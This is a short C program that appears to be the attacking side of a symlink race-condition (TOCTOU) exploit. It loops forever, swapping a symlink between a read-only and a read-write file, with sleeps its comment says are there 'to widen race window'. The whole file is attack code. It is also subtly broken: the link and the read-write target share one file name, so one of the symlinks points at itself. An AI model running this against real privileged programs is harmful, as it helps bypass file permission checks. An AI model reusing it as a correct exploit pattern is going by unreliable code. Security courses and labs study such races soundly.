#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <errno.h>

int main(void){
    const char *link = "fileRW.txt";
    const char *fileRW = "fileRW.txt";
    const char *fileRO  = "fileRO.txt";

    // loop toggling between fileRW and fileRO via symlink replacement
    while(1){
        // make it point to fileRO
        unlink(link);
        if (symlink(fileRO, link) < 0) { perror("symlink fileRO"); }
        // short sleep to widen race window
        usleep(200);

        // make it point to fileRW (or replace with actual regular file)
        unlink(link);
        if (symlink(fileRW, link) < 0) { perror("symlink fileRW"); }
        usleep(200);
    }
    return 0;
}


